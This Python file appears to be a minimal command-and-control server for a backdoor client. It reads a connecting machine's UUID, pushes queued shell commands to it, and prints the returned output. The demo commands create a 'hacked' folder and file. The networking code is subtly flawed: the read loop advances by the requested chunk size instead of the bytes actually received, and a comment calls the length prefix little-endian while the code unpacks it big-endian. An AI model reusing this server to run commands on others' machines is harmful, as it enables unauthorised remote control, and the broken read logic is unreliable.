from asyncio import Queue, StreamReader, StreamWriter, TimeoutError, run, start_server, wait_for
from datetime import datetime
import struct
from typing import Tuple


DEFAULT_TIMEOUT = 60


def _largest_power_of_two(n: int) -> int:

    """ Return largest power of two less than or equal to <n>. """

    # Prevent negative shift.
    if n < 1:
        return None
    return 1 << (n.bit_length() - 1)


async def _recv_data(reader: StreamReader,
                     length: int,
                     timeout: float) -> bytes:

    """ Receive <length> amount of data from <reader>. """

    if length < 1:
        return None

    # Preallocate bytearray.
    data = bytearray(length)
    index = 0
    while index < length:
        diff = length - index

        # Retrieve data in power of two sized chunks capped at <reader> limit.
        buf_size = _largest_power_of_two(diff)
        if buf_size > reader._limit:
            buf_size = reader._limit

        # Wait at most <timeout> seconds, then return None.
        try:
            chunk = await wait_for(reader.read(buf_size), timeout)
        except TimeoutError:
            return None

        # Return None in case less data received than expected.
        if not chunk:
            return None

        data[index:index+buf_size] = chunk
        index += buf_size

    # Return None in case more data received than expected.
    if len(data) > length:
        return None

    return bytes(data)


async def _read(reader: StreamReader,
                timeout: float = DEFAULT_TIMEOUT) -> bytes:

    # Each message is prepended by 4 bytes representing
    # the remaining message length. Assuming little-endian?
    chunk = await _recv_data(reader, 4, timeout)
    if not chunk:
        return None

    try:
        expected_len = struct.unpack('!I', chunk)[0]
    except struct.error:
        return None

    # Some commands might not write to stdout, so response can be empty.
    if expected_len == 0:
        return b''

    # Read stream until <expected_len> bytes.
    return await _recv_data(reader, expected_len, timeout)


async def _send(writer: StreamWriter,
                cmd: bytes) -> None:

    writer.write(cmd)
    await writer.drain()


async def _handle(reader: StreamReader,
                  writer: StreamWriter) -> None:

    # Initial message consists of only client UUID.
    uuid = await _read(reader)

    print(f'{uuid.hex()} is quacking.')

    # Example
    jobs = Queue()
    jobs.put_nowait(b'mkdir ~/hacked')
    jobs.put_nowait(b'touch ~/hacked/hacked.txt')
    jobs.put_nowait(b"echo 'You got hacked!' > ~/hacked/hacked.txt")
    jobs.put_nowait(b'cat ~/hacked/hacked.txt')
    jobs.put_nowait(b'exit')

    # Send payloads as they are enqueued.
    while (cmd := await jobs.get()) != b'exit':
        await _send(writer, cmd)
        start = datetime.now()
        response = await _read(reader)

        # Some error happened while receiving.
        if response == None:
            break

        print(f"\nCommand:\t{cmd.decode('utf-8')}")
        print(f'Response size:\t{len(response)} bytes')
        print(f'Response time:\t{datetime.now() - start}\n')
        if response:
            print(response.decode('utf-8'))
    else:
        await _send(writer, cmd)

    writer.close()


async def start(addr: Tuple[str, int]) -> None:

    server = await start_server(_handle, *addr)

    async with server:
        await server.serve_forever()


try:
    run(start(('localhost', 5000)))
except KeyboardInterrupt:
    pass
